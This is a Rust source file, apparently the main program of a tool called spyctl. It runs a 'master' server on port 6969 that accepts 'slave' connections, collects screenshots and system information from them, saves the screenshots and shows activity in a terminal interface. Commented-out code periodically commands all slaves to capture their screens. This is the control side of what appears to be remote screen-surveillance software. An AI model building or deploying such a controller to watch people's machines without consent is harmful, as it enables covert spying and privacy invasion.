use ratatui::{prelude::CrosstermBackend, Terminal};
use spyctl::{
    common::{messages, util::save_sceenshots},
    master::{
        comms::run_master,
        tui::{
            app::{App, AppResult, IncomingMessage, Log},
            event::{Event, EventHandler},
            handler::handle_key_events,
            tui::Tui,
        },
    },
};
use std::io;
use tokio::sync::mpsc;

#[tokio::main]
async fn main() -> AppResult<()> {
    // Create a channel for communication between run_master and the main TUI loop
    let (tx, mut rx) = mpsc::channel(100);

    // Initialize the terminal user interface.
    let backend = CrosstermBackend::new(io::stdout());
    let terminal = Terminal::new(backend)?;
    let events = EventHandler::new(250);
    let mut tui = Tui::new(terminal, events);
    tui.init()?;

    // Spawn the run_master task
    let peer_map = tokio::spawn(async move { run_master("0.0.0.0:6969", tx).await.unwrap() }).await.unwrap();

    // Create the TUI with app state.
    let mut app = App::new(peer_map);

    app.add_log(Log::Info("Spawned and awaiting clients!".to_string()));

    // Start the main loop.
    while app.running {
        // Render the user interface.
        tui.draw(&mut app)?;

        tokio::select! {
            // Handle UI events
            event = tui.events.next() => {
                match event? {
                    Event::Tick => app.tick(),
                    Event::Key(key_event) => handle_key_events(key_event, &mut app)?,
                    Event::Mouse(_) => {}
                    Event::Resize(_, _) => {}
                }
            }
            // Handle messages from run_master
            Some(message) = rx.recv() => {
                match message {
                    IncomingMessage::NewConnection(addr) => {
                        app.add_log(Log::Result(format!("New connection from: {}",addr)));
                        app.add_slave(&addr);
                    }
                    IncomingMessage::NewResponse(socket_addr, response) => {
                        match response {
                            messages::Response::Screens(screenshots) => {
                                app.add_log(Log::Result(format!("Screenshot from :: {}", socket_addr)));
                                save_sceenshots(screenshots, socket_addr.to_string());
                            },
                            messages::Response::SystemInfo(system_info) => {
                                app.add_log(Log::Result(format!("System info from {} :: {}", socket_addr, system_info)))
                            },
                            messages::Response::Status(status) => {
                                app.add_log(Log::Result(format!("Status from {} :: {}", socket_addr, status)));
                            },
                            messages::Response::Error(error) => {
                                app.add_log(Log::Error(format!("Error from {} :: {}", socket_addr, error)));
                            },
                        }
                    },
                    IncomingMessage::LogInfo(text) => {
                        app.add_log(Log::Info(format!("Info :: {}", text)));
                    },
                    IncomingMessage::LogError(text) => {
                        app.add_log(Log::Error(format!("Error :: {}", text)));
                    },
                    IncomingMessage::LogResult(text) => {
                        app.add_log(Log::Result(format!("Result :: {}", text)));
                    },
                }
            }
        }
    }

    // Exit the user interface.
    tui.exit()?;
    Ok(())
}

// use std::{io, thread};

// use spyctl::{
//     common::messages::Command,
//     master::comms::{run_master, send_command_to_all, PeerMap},
// };

// use ratatui::{
//     crossterm::event::{self, KeyCode, KeyEventKind},
//     style::Stylize,
//     widgets::Paragraph,
//     DefaultTerminal,
// };

// #[tokio::main]
// pub async fn main() {
//     let addr = "localhost:6969";

//     let peer_map = run_master(addr).await.unwrap();

//     // Start the TUI in a separate thread
//     start_tui(peer_map.clone());

//     // Keep the main thread alive
//     tokio::signal::ctrl_c().await.unwrap();
//     println!("Shutting down");
// }

// fn start_tui(peer_map: PeerMap) {
//     loop {
//         // Example: send a command to all slaves every 5 seconds
//         send_command_to_all(Command::CaptureScreens, &peer_map);
//         thread::sleep(std::time::Duration::from_secs(10));
//     }
// }
